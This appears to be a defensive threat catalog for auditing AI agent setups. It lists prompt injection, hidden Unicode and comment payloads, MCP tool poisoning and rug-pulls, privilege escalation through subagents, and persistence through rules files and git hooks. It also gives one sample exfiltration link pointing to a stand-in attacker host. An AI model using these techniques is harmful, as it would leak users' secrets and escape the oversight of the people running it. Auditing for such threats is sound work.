# Threat catalog

Load this when auditing prompts, skills, custom agents, MCP servers, agent workflows, repositories, or dependencies. Use it as a systematic inspection map—not proof that every threat applies.

## 1. Direct prompt injection

The interactive user attempts to override trusted policy: claiming admin/developer authority, requesting hidden system prompts or environment secrets, disabling approval checks, or reframing restricted actions as hypothetical tests.

## 2. Indirect injection & instruction/data confusion

Adversarial instructions enter through untrusted data the agent reads: repository files, PR/issue text, code comments, test fixtures, commit messages, web pages, RAG chunks, build logs, or tool error messages. Delimiters and XML tags clarify structure for the model but **do not** make untrusted text non-executable.

## 3. Obfuscated & steganographic payloads

Inspect untrusted files, skills, and templates for hidden instruction channels that evade casual human diff review:

- Invisible Unicode tag characters (`U+E0000`–`U+E007F`), zero-width joiners/spaces, homoglyphs, and bidirectional text overrides (`Trojan Source`).
- HTML comments (`<!-- ... -->`), Markdown reference-link metadata, hidden SVG/image text, or base64/hex-encoded strings inside fixtures that prompts instruct the model to decode.

## 4. MCP & tool-metadata poisoning / rug-pulls

Tool definitions themselves sit inside the model's trusted context window:

- **Metadata injection:** Malicious or compromised MCP servers embedding covert instructions inside tool `description` fields, JSON parameter schemas, or structured error responses.
- **Tool shadowing:** A third-party MCP server registering a tool name colliding with or mimicking a trusted built-in/sibling server tool to intercept arguments or redirect writes.
- **Rug-pulls (post-approval mutation):** Remote or unpinned MCP servers altering tool schemas or behavior after initial user inspection.

## 5. Multi-agent & subagent confused-deputy escalation

- **Cross-agent laundering:** A low-privilege read-only subagent (`explore`, `research`) ingests untrusted repo/web content and returns a poisoned summary that persuades a higher-privilege parent orchestrator to run shell commands or edit files.
- **Transitive delegation:** An agent bypassing its own `edit: deny` or `shell: deny` rule by spawning a sibling/child subagent whose permissions are broader.

## 6. Secret exposure & exfiltration

- Credentials, `.env` values, API keys, session cookies, or private keys read into model context, echoed in logs, or captured in crash/diagnostic dumps.
- **Zero-click rendering exfiltration:** Model output rendering Markdown images (`![x](https://attacker.tld/leak?d=...)`), auto-previewed links, or Mermaid/HTML blocks that exfiltrate context data on view.
- Outbound exfiltration via `curl`, `fetch`, DNS lookups, git remotes, or third-party MCP tool arguments.

## 7. Excessive agency & unsafe execution

- Broad write, delete, shell, or network tools granted where narrow read-only or schema-bound tools suffice.
- Shell command interpolation of model-generated or untrusted strings; path traversal (`../`), absolute paths outside workspace roots, and **symlink escapes** pointing outside sandboxed directories.
- Non-idempotent or destructive operations (recursive deletes, `git reset --hard`, force-pushes, DB migrations, external publications) lacking dry-runs or explicit human approval.
- Unbounded agentic loops, recursive subagent spawning, or missing token/time/retry budgets.

## 8. Output handling & downstream trust

- Treating syntactically valid JSON/structured output as semantically authorized (e.g., model-chosen SQL fragments, file paths, role flags, or shell arguments passed to executors without allowlist validation).
- Rendering model-generated HTML, Markdown, or scripts directly into privileged UI surfaces.

## 9. Persistent state & supply-chain poisoning

- **Cross-session persistence:** Indirect injection modifying `AGENTS.md`, `GEMINI.md`, `.agents/rules/`, `SKILL.md`, Knowledge Items, memory stores, `.git/hooks/`, or CI workflows so compromise survives into future sessions.
- **Skill/plugin supply chain:** Unreviewed third-party skills, unpinned npm/pip/MCP packages (`@latest`), scripts executed automatically during orientation/review, or remote HTTP skill catalogs refreshed without verifying `index.json`, safe relative paths, and version pinning.

## Remediation Split

For every finding, distinguish:

1. **Advisory prompt hardening** (clear trust labeling, narrow role scope, explicit refusal cues); and
2. **Enforced runtime boundary** (sandbox isolation, host `permissions` in `opencode.jsonc` / `agy` policy, path containment, schema allowlists, pinned hashes, and human approval gates).
